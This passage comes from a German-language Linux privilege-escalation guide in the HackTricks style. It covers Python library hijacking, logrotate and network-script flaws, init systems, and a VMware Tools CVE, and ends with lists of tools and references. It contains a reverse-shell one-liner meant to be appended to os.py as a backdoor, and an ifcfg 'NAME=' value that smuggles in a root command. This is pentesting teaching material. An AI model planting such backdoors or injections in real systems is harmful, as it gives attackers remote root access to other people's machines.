Du solltest auch nach Dateien suchen, die das Wort "**password**" in ihrem **Namen** oder im **Inhalt** enthalten, und auch nach IPs und E-Mails in Logs oder nach Hash-Regexps.\
Ich werde hier nicht auflisten, wie man all das macht, aber wenn du daran interessiert bist, kannst du die letzten Checks ansehen, die [**linpeas**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/blob/master/linPEAS/linpeas.sh) durchführt.

## Schreibbare Dateien

### Python library hijacking

Wenn du weißt, **von wo** aus ein Python-Skript ausgeführt wird und du **in diesen Ordner schreiben kannst** oder **Python-Libraries ändern kannst**, kannst du die OS-Library modifizieren und sie backdooren (wenn du dort schreiben kannst, von wo das Python-Skript ausgeführt wird, kopiere und füge die os.py-Library ein).

Um die **Library zu backdooren**, füge einfach am Ende der os.py-Library die folgende Zeile hinzu (ändere IP und PORT):
```python
import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.14",5678));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);
```
### Logrotate exploitation

Eine Schwachstelle in `logrotate` ermöglicht es Benutzern mit **Schreibrechten** auf eine Logdatei oder deren übergeordnete Verzeichnisse, möglicherweise eskalierte Privilegien zu erlangen. Das liegt daran, dass `logrotate`, oft als **root** ausgeführt, dazu manipuliert werden kann, beliebige Dateien auszuführen, insbesondere in Verzeichnissen wie _**/etc/bash_completion.d/**_. Es ist wichtig, die Berechtigungen nicht nur in _/var/log_ zu prüfen, sondern auch in jedem Verzeichnis, in dem Log-Rotation angewendet wird.

> [!TIP]
> Diese Schwachstelle betrifft `logrotate` Version `3.18.0` und älter

Ausführlichere Informationen zur Schwachstelle finden sich auf dieser Seite: [https://tech.feedyourhead.at/content/details-of-a-logrotate-race-condition](https://tech.feedyourhead.at/content/details-of-a-logrotate-race-condition).

Du kannst diese Schwachstelle mit [**logrotten**](https://github.com/whotwagner/logrotten) ausnutzen.

Diese Schwachstelle ist [**CVE-2016-1247**](https://www.cvedetails.com/cve/CVE-2016-1247/) **(nginx logs),** sehr ähnlich, also prüfe immer, wenn du Logs verändern kannst, wer diese Logs verwaltet, und ob du Privilegien eskalieren kannst, indem du die Logs durch Symlinks ersetzt.

### /etc/sysconfig/network-scripts/ (Centos/Redhat)

**Vulnerability reference:** [**https://vulmon.com/exploitdetails?qidtp=maillist_fulldisclosure\&qid=e026a0c5f83df4fd532442e1324ffa4f**](https://vulmon.com/exploitdetails?qidtp=maillist_fulldisclosure&qid=e026a0c5f83df4fd532442e1324ffa4f)

Wenn ein Benutzer aus welchem Grund auch immer ein `ifcf-<whatever>`-Skript in _/etc/sysconfig/network-scripts_ **schreiben** kann **oder** ein vorhandenes **anpassen** kann, dann ist dein **System pwned**.

Netzwerkskripte, zum Beispiel _ifcg-eth0_, werden für Netzwerkverbindungen verwendet. Sie sehen genau wie .INI-Dateien aus. Allerdings werden sie unter Linux vom Network Manager (dispatcher.d) \~sourced\~.

In meinem Fall wird das Attribut `NAME=` in diesen Netzwerkskripten nicht korrekt verarbeitet. Wenn im Namen **Leer-/Blankzeichen** enthalten sind, versucht das System, den Teil nach dem Leer-/Blankzeichen auszuführen. Das bedeutet, dass **alles nach dem ersten Leerzeichen als root ausgeführt wird**.

Zum Beispiel: _/etc/sysconfig/network-scripts/ifcfg-1337_
```bash
NAME=Network /bin/id
ONBOOT=yes
DEVICE=eth0
```
(_Hinweis auf den leeren Abstand zwischen Network und /bin/id_)

### **init, init.d, systemd, and rc.d**

Das Verzeichnis `/etc/init.d` ist die Heimat von **Skripten** für System V init (SysVinit), dem **klassischen Linux-Dienstverwaltungssystem**. Es enthält Skripte zum `start`, `stop`, `restart` und manchmal `reload` von Diensten. Diese können direkt oder über symbolische Links ausgeführt werden, die in `/etc/rc?.d/` zu finden sind. Ein alternativer Pfad auf Redhat-Systemen ist `/etc/rc.d/init.d`.

Andererseits ist `/etc/init` mit **Upstart** verbunden, einer neueren **Dienstverwaltung**, die von Ubuntu eingeführt wurde und Konfigurationsdateien für Aufgaben der Dienstverwaltung verwendet. Trotz des Übergangs zu Upstart werden SysVinit-Skripte weiterhin zusammen mit Upstart-Konfigurationen genutzt, da Upstart eine Kompatibilitätsschicht besitzt.

**systemd** tritt als moderner Initialisierungs- und Dienstmanager auf und bietet erweiterte Funktionen wie bedarfsabhängiges Starten von Daemons, Automount-Verwaltung und Systemzustands-Snapshots. Es organisiert Dateien in `/usr/lib/systemd/` für Distributionspakete und `/etc/systemd/system/` für Änderungen durch Administratoren, wodurch der Systemverwaltungsprozess vereinfacht wird.

## Other Tricks

### NFS Privilege escalation


{{#ref}}
nfs-no_root_squash-misconfiguration-pe.md
{{#endref}}

### Escaping from restricted Shells


{{#ref}}
escaping-from-limited-bash.md
{{#endref}}

### Cisco - vmanage


{{#ref}}
cisco-vmanage.md
{{#endref}}

## Android rooting frameworks: manager-channel abuse

Android rooting frameworks hooken häufig einen syscall, um privilegierte Kernel-Funktionalität einem Userspace-manager bereitzustellen. Schwache manager-Authentifizierung (z. B. Signaturprüfungen basierend auf FD-Reihenfolge oder schlechte Passwortschemata) kann es einer lokalen App ermöglichen, sich als manager auszugeben und auf bereits gerooteten Geräten root-Rechte zu erlangen. Mehr dazu und Exploit-Details hier:


{{#ref}}
android-rooting-frameworks-manager-auth-bypass-syscall-hook.md
{{#endref}}

## VMware Tools service discovery LPE (CWE-426) via regex-based exec (CVE-2025-41244)

Regex-gesteuerte service discovery in VMware Tools/Aria Operations kann einen Binärpfad aus Prozess-Commandlines extrahieren und ihn mit -v in einem privilegierten Kontext ausführen. Großzügige Muster (z. B. die Verwendung von \S) können vom Angreifer platzierte Listener an beschreibbaren Orten (z. B. /tmp/httpd) erfassen und so zur Ausführung als root führen (CWE-426 Untrusted Search Path).

Mehr dazu und ein verallgemeinertes Muster, das auf andere discovery/monitoring stacks anwendbar ist, hier:

{{#ref}}
vmware-tools-service-discovery-untrusted-search-path-cve-2025-41244.md
{{#endref}}

## Kernel Security Protections

- [https://github.com/a13xp0p0v/kconfig-hardened-check](https://github.com/a13xp0p0v/kconfig-hardened-check)
- [https://github.com/a13xp0p0v/linux-kernel-defence-map](https://github.com/a13xp0p0v/linux-kernel-defence-map)

## More help

[Static impacket binaries](https://github.com/ropnop/impacket_static_binaries)

## Linux/Unix Privesc Tools

### **Best tool to look for Linux local privilege escalation vectors:** [**LinPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS)

**LinEnum**: [https://github.com/rebootuser/LinEnum](https://github.com/rebootuser/LinEnum)(-t option)\
**Enumy**: [https://github.com/luke-goddard/enumy](https://github.com/luke-goddard/enumy)\
**Unix Privesc Check:** [http://pentestmonkey.net/tools/audit/unix-privesc-check](http://pentestmonkey.net/tools/audit/unix-privesc-check)\
**Linux Priv Checker:** [www.securitysift.com/download/linuxprivchecker.py](http://www.securitysift.com/download/linuxprivchecker.py)\
**BeeRoot:** [https://github.com/AlessandroZ/BeRoot/tree/master/Linux](https://github.com/AlessandroZ/BeRoot/tree/master/Linux)\
**Kernelpop:** Kernel-Schwachstellen in Linux und MAC aufzählen [https://github.com/spencerdodd/kernelpop](https://github.com/spencerdodd/kernelpop)\
**Mestaploit:** _**multi/recon/local_exploit_suggester**_\
**Linux Exploit Suggester:** [https://github.com/mzet-/linux-exploit-suggester](https://github.com/mzet-/linux-exploit-suggester)\
**EvilAbigail (physical access):** [https://github.com/GDSSecurity/EvilAbigail](https://github.com/GDSSecurity/EvilAbigail)\
**Recopilation of more scripts**: [https://github.com/1N3/PrivEsc](https://github.com/1N3/PrivEsc)

## References

- [0xdf – HTB Planning (Crontab UI privesc, zip -P creds reuse)](https://0xdf.gitlab.io/2025/09/13/htb-planning.html)
- [0xdf – HTB Era: forged .text_sig payload for cron-executed monitor](https://0xdf.gitlab.io/2025/11/29/htb-era.html)
- [0xdf – Holiday Hack Challenge 2025: Neighborhood Watch Bypass (sudo env_keep PATH hijack)](https://0xdf.gitlab.io/holidayhack2025/act1/neighborhood-watch)
- [alseambusher/crontab-ui](https://github.com/alseambusher/crontab-ui)
- [https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/](https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/)
- [https://payatu.com/guide-linux-privilege-escalation/](https://payatu.com/guide-linux-privilege-escalation/)
- [https://pen-testing.sans.org/resources/papers/gcih/attack-defend-linux-privilege-escalation-techniques-2016-152744](https://pen-testing.sans.org/resources/papers/gcih/attack-defend-linux-privilege-escalation-techniques-2016-152744)
- [http://0x90909090.blogspot.com/2015/07/no-one-expect-command-execution.html](http://0x90909090.blogspot.com/2015/07/no-one-expect-command-execution.html)
- [https://touhidshaikh.com/blog/?p=827](https://touhidshaikh.com/blog/?p=827)
- [https://github.com/sagishahar/lpeworkshop/blob/master/Lab%20Exercises%20Walkthrough%20-%20Linux.pdf](https://github.com/sagishahar/lpeworkshop/blob/master/Lab%20Exercises%20Walkthrough%20-%20Linux.pdf)
- [https://github.com/frizb/Linux-Privilege-Escalation](https://github.com/frizb/Linux-Privilege-Escalation)
- [https://github.com/lucyoa/kernel-exploits](https://github.com/lucyoa/kernel-exploits)
- [https://github.com/rtcrowley/linux-private-i](https://github.com/rtcrowley/linux-private-i)
- [https://www.linux.com/news/what-socket/](https://www.linux.com/news/what-socket/)
- [https://muzec0318.github.io/posts/PG/peppo.html](https://muzec0318.github.io/posts/PG/peppo.html)
- [https://www.linuxjournal.com/article/7744](https://www.linuxjournal.com/article/7744)
- [https://blog.certcube.com/suid-executables-linux-privilege-escalation/](https://blog.certcube.com/suid-executables-linux-privilege-escalation/)
- [https://juggernaut-sec.com/sudo-part-2-lpe](https://juggernaut-sec.com/sudo-part-2-lpe)
- [https://linuxconfig.org/how-to-manage-acls-on-linux](https://linuxconfig.org/how-to-manage-acls-on-linux)
- [https://vulmon.com/exploitdetails?qidtp=maillist_fulldisclosure\&qid=e026a0c5f83df4fd532442e1324ffa4f](https://vulmon.com/exploitdetails?qidtp=maillist_fulldisclosure&qid=e026a0c5f83df4fd532442e1324ffa4f)
- [https://www.linode.com/docs/guides/what-is-systemd/](https://www.linode.com/docs/guides/what-is-systemd/)
- [0xdf – HTB Eureka (bash arithmetic injection via logs, overall chain)](https://0xdf.gitlab.io/2025/08/30/htb-eureka.html)
- [GNU Bash Manual – BASH_ENV (non-interactive startup file)](https://www.gnu.org/software/bash/manual/bash.html#index-BASH_005fENV)
- [0xdf – HTB Environment (sudo env_keep BASH_ENV → root)](https://0xdf.gitlab.io/2025/09/06/htb-environment.html)
- [0xdf – HTB Previous (sudo terraform dev_overrides + TF_VAR symlink privesc)](https://0xdf.gitlab.io/2026/01/10/htb-previous.html)
- [0xdf – HTB Slonik (pg_basebackup cron copy → SUID bash)](https://0xdf.gitlab.io/2026/02/12/htb-slonik.html)
- [NVISO – You name it, VMware elevates it (CVE-2025-41244)](https://blog.nviso.eu/2025/09/29/you-name-it-vmware-elevates-it-cve-2025-41244/)
- [0xdf – HTB: Expressway](https://0xdf.gitlab.io/2026/03/07/htb-expressway.html)
- [0xdf – HTB: Browsed](https://0xdf.gitlab.io/2026/03/28/htb-browsed.html)
- [PEP 3147 – PYC Repository Directories](https://peps.python.org/pep-3147/)
- [Python importlib docs](https://docs.python.org/3/library/importlib.html)

{{#include ../../banners/hacktricks-training.md}}
